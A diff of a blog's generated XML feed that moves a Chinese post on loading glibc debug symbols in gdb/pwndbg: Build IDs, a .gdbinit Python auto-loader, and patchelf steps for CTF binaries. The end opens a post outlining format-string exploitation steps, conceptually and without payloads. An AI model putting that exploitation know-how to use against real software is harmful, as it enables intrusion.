+                      class=""
+                >
+
+
+
+<h4 id="手动加载符号文件"><a href="#手动加载符号文件" class="headerlink" title="手动加载符号文件"></a>手动加载符号文件</h4><p>一般来说，我们用<code>glibc-all-in-one</code>下载到的glibc都是连带着<code>.debug</code>一起下的，但我们pwndbg会找不到目标的符号文件。我们可以直接在gdb中用<code>add-symbol-file /path/to/.debug</code>来读取符号信息。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/11/23/%E5%B8%A6%E7%AC%A6%E5%8F%B7%E8%B0%83%E8%AF%95-gdb%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96%E5%8A%A0%E8%BD%BD/image-20241123105847709.png"
+                      class=""
+                >
+
+<p>或者也可以在<code>~/.gdbinit</code>中加一个<code>set debug-file-directory /path/to/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/.debug/</code>，然后进入gdb时就会自动检索到<code>.debug</code>文件，附加调试符号信息。</p>
+<h4 id="自动化进行附加符号文件"><a href="#自动化进行附加符号文件" class="headerlink" title="自动化进行附加符号文件"></a>自动化进行附加符号文件</h4><p>既然我们已经知道了手动附加的原理，这里我们就可以尝试使用脚本进行自动化附加。这里我们选择用gdb中的<code>info proc mappings</code>命令来获取libc的基址以及路径，后续.debug文件路径的判断也是基于此。所以我们想要附加生效，就要链接到glibc-all-in-one中的libc。</p>
+<p>在gdbinit中加入如下命令，这里使用了<code>gdb.events.stop.connect</code>来使gdb在停下来的时候调用函数进行加载<code>symbol file</code>，这是因为gdb.attach(p)时，<code>.gdbinit</code>是先加载后再把gdb附加到进程的，如果直接调用会报错。</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">python</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">DEBUG_FILE_DIR = <span class="string">&quot;/home/collectcrop/glibc_run/glibc-all-in-one/libs&quot;</span></span><br><span class="line">symbols_loaded = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_build_id</span>(<span class="params">lib_path</span>):</span><br><span class="line">    <span class="comment">#从给定的库路径提取 build-id</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">	<span class="comment">#用外部命令获取build id</span></span><br><span class="line">        res = subprocess.check_output(</span><br><span class="line">            <span class="string">f&quot;readelf -n <span class="subst">&#123;lib_path&#125;</span> | grep &#x27;Build ID&#x27;&quot;</span>, </span><br><span class="line">            shell=<span class="literal">True</span>, </span><br><span class="line">            text=<span class="literal">True</span></span><br><span class="line">        )</span><br><span class="line">        <span class="comment"># 提取 Build ID 字符串</span></span><br><span class="line">        build_id = res[res.find(<span class="string">&#x27;:&#x27;</span>)+<span class="number">2</span>:]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] Build ID: <span class="subst">&#123;build_id&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> build_id</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">except</span> gdb.error <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] Error extracting build-id for <span class="subst">&#123;lib_path&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_debug_symbols</span>():</span><br><span class="line">    <span class="keyword">global</span> symbols_loaded</span><br><span class="line">    mappings = gdb.execute(<span class="string">&quot;info proc mappings&quot;</span>, to_string=<span class="literal">True</span>).splitlines()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> mappings:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;/libc.so&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">            parts = line.split()</span><br><span class="line">            libc_path = parts[-<span class="number">1</span>]</span><br><span class="line">            libc_base = parts[<span class="number">0</span>]</span><br><span class="line">            build_id = get_build_id(libc_path)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> build_id:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-] Could not determine Build ID for libc.&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            </span><br><span class="line">            DEBUG_FILE_DIR = libc_path.replace(<span class="string">&quot;/libc.so.6&quot;</span>, <span class="string">&quot;/.debug/.build-id&quot;</span>)</span><br><span class="line">            <span class="comment"># 解析 .debug 文件路径</span></span><br><span class="line">            debug_file_path = os.path.join(</span><br><span class="line">                DEBUG_FILE_DIR,</span><br><span class="line">                build_id[:<span class="number">2</span>],</span><br><span class="line">                build_id[<span class="number">2</span>:].replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>) + <span class="string">&quot;.debug&quot;</span></span><br><span class="line">            )</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[*] debug file: <span class="subst">&#123;debug_file_path&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> os.path.exists(DEBUG_FILE_DIR):</span><br><span class="line">                <span class="keyword">if</span> os.path.exists(debug_file_path):</span><br><span class="line">                    gdb.execute(<span class="string">f&quot;add-symbol-file <span class="subst">&#123;debug_file_path&#125;</span> <span class="subst">&#123;libc_base&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[+] Loaded symbols for <span class="subst">&#123;libc_path&#125;</span> from <span class="subst">&#123;debug_file_path&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[-] Debug file not found: <span class="subst">&#123;debug_file_path&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[-] Build ID directory not found: <span class="subst">&#123;DEBUG_FILE_DIR&#125;</span>&quot;</span>)</span><br><span class="line">            symbols_loaded = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 延迟加载符号，确保附加到进程后运行</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_stop</span>(<span class="params">event</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> symbols_loaded:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Target process stopped. Attempting to load symbols...&quot;</span>)</span><br><span class="line">        load_debug_symbols()</span><br><span class="line"></span><br><span class="line">gdb.events.stop.connect(on_stop)</span><br><span class="line">end</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>然后就能愉快地调试了，好耶。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/11/23/%E5%B8%A6%E7%AC%A6%E5%8F%B7%E8%B0%83%E8%AF%95-gdb%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96%E5%8A%A0%E8%BD%BD/image-20241123121652093.png"
+                      class=""
+                >
+
+
+
+<h4 id="一般换库步骤"><a href="#一般换库步骤" class="headerlink" title="一般换库步骤"></a>一般换库步骤</h4><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">strings ./libc.so.6  | grep &#x27;GNU&#x27;		#看给的libc版本</span><br><span class="line">ldd ./binary							#看程序动态链接库的情况</span><br><span class="line">patchelf --replace-needed original_libc target_libc ./binary	#换libc，original_libc由上面ldd能看到</span><br><span class="line">patchelf --set-interpreter target_ld ./binary					#换ld</span><br></pre></td></tr></table></figure></div>
+
+]]></content>
+      <categories>
+        <category>debug</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>gdb</tag>
+        <tag>debug</tag>
       </tags>
   </entry>
   <entry>
@@ -2458,93 +2542,9 @@
       </tags>
   </entry>
   <entry>
-    <title>带符号调试-gdb脚本实现自动化加载</title>
-    <url>/blog/2024/11/23/%E5%B8%A6%E7%AC%A6%E5%8F%B7%E8%B0%83%E8%AF%95-gdb%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96%E5%8A%A0%E8%BD%BD/</url>
-    <content><![CDATA[<h2 id="带符号调试-gdb脚本实现自动化加载"><a href="#带符号调试-gdb脚本实现自动化加载" class="headerlink" title="带符号调试-gdb脚本实现自动化加载"></a>带符号调试-gdb脚本实现自动化加载</h2><h4 id="问题由来"><a href="#问题由来" class="headerlink" title="问题由来"></a>问题由来</h4><p>在对于堆的<code>_IO_FILE</code>利用的学习过程中，我们通常需要伪造一个fake_IO_FILE，并且附带源码调试，以方便清除是否进入了目标函数，是否一些条件判断通过。但是有时候却在pwndbg加载时找不到对应的glibc的symbol file文件，这就导致我们无法进行源码级别调试，而且看结构体只能自己一个一个字段带进去看，十分麻烦。所以这里介绍一下如何方便地进行带符号调试。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/11/23/%E5%B8%A6%E7%AC%A6%E5%8F%B7%E8%B0%83%E8%AF%95-gdb%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96%E5%8A%A0%E8%BD%BD/image-20241123103232492.png"
-                      class=""
-                >
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/11/23/%E5%B8%A6%E7%AC%A6%E5%8F%B7%E8%B0%83%E8%AF%95-gdb%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96%E5%8A%A0%E8%BD%BD/image-20241123103325230.png"
-                      class=""
-                >
-
-<h4 id="符号文件"><a href="#符号文件" class="headerlink" title="符号文件"></a>符号文件</h4><h5 id="Build-ID"><a href="#Build-ID" class="headerlink" title="Build ID"></a>Build ID</h5><p><code>Build ID</code> 是 ELF 文件（可执行文件和共享库）中一个独特的标识符，用于标识文件的内容。它是一个不可变的标志，通常用来快速匹配文件与其调试符号或源代码。</p>
-<hr>
-<h6 id="主要用途"><a href="#主要用途" class="headerlink" title="主要用途"></a><strong>主要用途</strong></h6><ol>
-<li><strong>唯一标识 ELF 文件</strong>：<ul>
-<li>即使文件名或路径改变，<code>Build ID</code> 仍然可以唯一标识文件。</li>
-<li>不同编译选项或源代码的修改会导致新的 <code>Build ID</code>。</li>
-</ul>
-</li>
-<li><strong>关联调试符号和源代码</strong>：<ul>
-<li>调试符号文件（如 <code>.debug</code> 文件）通常使用 <code>Build ID</code> 来匹配对应的 ELF 文件。</li>
-</ul>
-</li>
-<li><strong>软件包管理和安全检查</strong>：<ul>
-<li>用于确保文件未被篡改，或用于匹配特定版本的依赖项。</li>
-</ul>
-</li>
-</ol>
-<hr>
-<h6 id="生成方式"><a href="#生成方式" class="headerlink" title="生成方式"></a><strong>生成方式</strong></h6><p><code>Build ID</code> 是通过对 ELF 文件的内容（如代码段和数据段）进行哈希计算生成的，具体方式取决于工具链。它通常由 <strong>编译器</strong> 或 <strong>链接器</strong> 自动生成，存储在 ELF 文件的 <code>.note.gnu.build-id</code> 段中。</p>
-<h6 id="查看-ELF-文件的-Build-ID"><a href="#查看-ELF-文件的-Build-ID" class="headerlink" title="查看 ELF 文件的 Build ID"></a><strong>查看 ELF 文件的 Build ID</strong></h6><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">1.readelf -n /path/to/file | grep &#x27;Build ID&#x27;</span><br><span class="line">2.file /path/to/file</span><br></pre></td></tr></table></figure></div>
-
-<h5 id="debug"><a href="#debug" class="headerlink" title=".debug"></a>.debug</h5><p>通常<code>symbol file</code>会在一个<code>.debug/.build-id/xx/</code>的目录下，这里在<code>build-id</code>中会有一堆2位16进制数构成的目录名，实际在.debug文件检索时，会先根据<code>build-id</code>的第一个字节（最高位）来进入对应前缀的文件夹，然后在该目录下找对应的.debug文件。比如我们的<code>build-id</code>为<code>89c3cb85f9e55046776471fed05ec441581d1969</code>，那么我们目标的.debug文件就在<code>.debug/.build-id/89/c3cb85f9e55046776471fed05ec441581d1969.debug</code>这个位置。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/11/23/%E5%B8%A6%E7%AC%A6%E5%8F%B7%E8%B0%83%E8%AF%95-gdb%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96%E5%8A%A0%E8%BD%BD/image-20241123105018012.png"
-                      class=""
-                >
-
-
-
-<h4 id="手动加载符号文件"><a href="#手动加载符号文件" class="headerlink" title="手动加载符号文件"></a>手动加载符号文件</h4><p>一般来说，我们用<code>glibc-all-in-one</code>下载到的glibc都是连带着<code>.debug</code>一起下的，但我们pwndbg会找不到目标的符号文件。我们可以直接在gdb中用<code>add-symbol-file /path/to/.debug</code>来读取符号信息。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/11/23/%E5%B8%A6%E7%AC%A6%E5%8F%B7%E8%B0%83%E8%AF%95-gdb%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96%E5%8A%A0%E8%BD%BD/image-20241123105847709.png"
-                      class=""
-                >
-
-<p>或者也可以在<code>~/.gdbinit</code>中加一个<code>set debug-file-directory /path/to/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/.debug/</code>，然后进入gdb时就会自动检索到<code>.debug</code>文件，附加调试符号信息。</p>
-<h4 id="自动化进行附加符号文件"><a href="#自动化进行附加符号文件" class="headerlink" title="自动化进行附加符号文件"></a>自动化进行附加符号文件</h4><p>既然我们已经知道了手动附加的原理，这里我们就可以尝试使用脚本进行自动化附加。这里我们选择用gdb中的<code>info proc mappings</code>命令来获取libc的基址以及路径，后续.debug文件路径的判断也是基于此。所以我们想要附加生效，就要链接到glibc-all-in-one中的libc。</p>
-<p>在gdbinit中加入如下命令，这里使用了<code>gdb.events.stop.connect</code>来使gdb在停下来的时候调用函数进行加载<code>symbol file</code>，这是因为gdb.attach(p)时，<code>.gdbinit</code>是先加载后再把gdb附加到进程的，如果直接调用会报错。</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">python</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">DEBUG_FILE_DIR = <span class="string">&quot;/home/collectcrop/glibc_run/glibc-all-in-one/libs&quot;</span></span><br><span class="line">symbols_loaded = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_build_id</span>(<span class="params">lib_path</span>):</span><br><span class="line">    <span class="comment">#从给定的库路径提取 build-id</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">	<span class="comment">#用外部命令获取build id</span></span><br><span class="line">        res = subprocess.check_output(</span><br><span class="line">            <span class="string">f&quot;readelf -n <span class="subst">&#123;lib_path&#125;</span> | grep &#x27;Build ID&#x27;&quot;</span>, </span><br><span class="line">            shell=<span class="literal">True</span>, </span><br><span class="line">            text=<span class="literal">True</span></span><br><span class="line">        )</span><br><span class="line">        <span class="comment"># 提取 Build ID 字符串</span></span><br><span class="line">        build_id = res[res.find(<span class="string">&#x27;:&#x27;</span>)+<span class="number">2</span>:]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] Build ID: <span class="subst">&#123;build_id&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> build_id</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">except</span> gdb.error <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] Error extracting build-id for <span class="subst">&#123;lib_path&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_debug_symbols</span>():</span><br><span class="line">    <span class="keyword">global</span> symbols_loaded</span><br><span class="line">    mappings = gdb.execute(<span class="string">&quot;info proc mappings&quot;</span>, to_string=<span class="literal">True</span>).splitlines()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> mappings:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;/libc.so&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">            parts = line.split()</span><br><span class="line">            libc_path = parts[-<span class="number">1</span>]</span><br><span class="line">            libc_base = parts[<span class="number">0</span>]</span><br><span class="line">            build_id = get_build_id(libc_path)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> build_id:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-] Could not determine Build ID for libc.&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            </span><br><span class="line">            DEBUG_FILE_DIR = libc_path.replace(<span class="string">&quot;/libc.so.6&quot;</span>, <span class="string">&quot;/.debug/.build-id&quot;</span>)</span><br><span class="line">            <span class="comment"># 解析 .debug 文件路径</span></span><br><span class="line">            debug_file_path = os.path.join(</span><br><span class="line">                DEBUG_FILE_DIR,</span><br><span class="line">                build_id[:<span class="number">2</span>],</span><br><span class="line">                build_id[<span class="number">2</span>:].replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>) + <span class="string">&quot;.debug&quot;</span></span><br><span class="line">            )</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[*] debug file: <span class="subst">&#123;debug_file_path&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> os.path.exists(DEBUG_FILE_DIR):</span><br><span class="line">                <span class="keyword">if</span> os.path.exists(debug_file_path):</span><br><span class="line">                    gdb.execute(<span class="string">f&quot;add-symbol-file <span class="subst">&#123;debug_file_path&#125;</span> <span class="subst">&#123;libc_base&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[+] Loaded symbols for <span class="subst">&#123;libc_path&#125;</span> from <span class="subst">&#123;debug_file_path&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[-] Debug file not found: <span class="subst">&#123;debug_file_path&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[-] Build ID directory not found: <span class="subst">&#123;DEBUG_FILE_DIR&#125;</span>&quot;</span>)</span><br><span class="line">            symbols_loaded = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 延迟加载符号，确保附加到进程后运行</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_stop</span>(<span class="params">event</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> symbols_loaded:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Target process stopped. Attempting to load symbols...&quot;</span>)</span><br><span class="line">        load_debug_symbols()</span><br><span class="line"></span><br><span class="line">gdb.events.stop.connect(on_stop)</span><br><span class="line">end</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-<p>然后就能愉快地调试了，好耶。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/11/23/%E5%B8%A6%E7%AC%A6%E5%8F%B7%E8%B0%83%E8%AF%95-gdb%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96%E5%8A%A0%E8%BD%BD/image-20241123121652093.png"
-                      class=""
-                >
-
-
-
-<h4 id="一般换库步骤"><a href="#一般换库步骤" class="headerlink" title="一般换库步骤"></a>一般换库步骤</h4><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">strings ./libc.so.6  | grep &#x27;GNU&#x27;		#看给的libc版本</span><br><span class="line">ldd ./binary							#看程序动态链接库的情况</span><br><span class="line">patchelf --replace-needed original_libc target_libc ./binary	#换libc，original_libc由上面ldd能看到</span><br><span class="line">patchelf --set-interpreter target_ld ./binary					#换ld</span><br></pre></td></tr></table></figure></div>
-
-]]></content>
-      <categories>
-        <category>debug</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-        <tag>gdb</tag>
-        <tag>debug</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>非栈上格式化字符串一次利用</title>
     <url>/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/</url>
-    <content><![CDATA[<h2 id="单次非栈上格式化字符串漏洞利用"><a href="#单次非栈上格式化字符串漏洞利用" class="headerlink" title="单次非栈上格式化字符串漏洞利用"></a>单次非栈上格式化字符串漏洞利用</h2><h4 id="问题发展路径"><a href="#问题发展路径" class="headerlink" title="问题发展路径"></a>问题发展路径</h4><ul>
+    <content><![CDATA[<h4 id="问题发展路径"><a href="#问题发展路径" class="headerlink" title="问题发展路径"></a>问题发展路径</h4><ul>
 <li>一开始最基本的格式化字符串漏洞任意地址写，没有什么限制</li>
 <li>进阶一点的是非栈上的格式化字符串漏洞利用，需要利用到栈上的指向程序名称的链条以及靠近内核区域的链条，但这种方法正常而言需要多次格式化字符串漏洞的执行利用，对目标地址改动越大需要利用到越多次。</li>
 <li>最后是在读取内容非栈上的情况下，实现在一次格式化字符串漏洞的触发中直接进行对一个栈上地址的两个字节的修改，可以用于减少利用格式化字符串漏洞的次数，绕过更多的限制。</li>
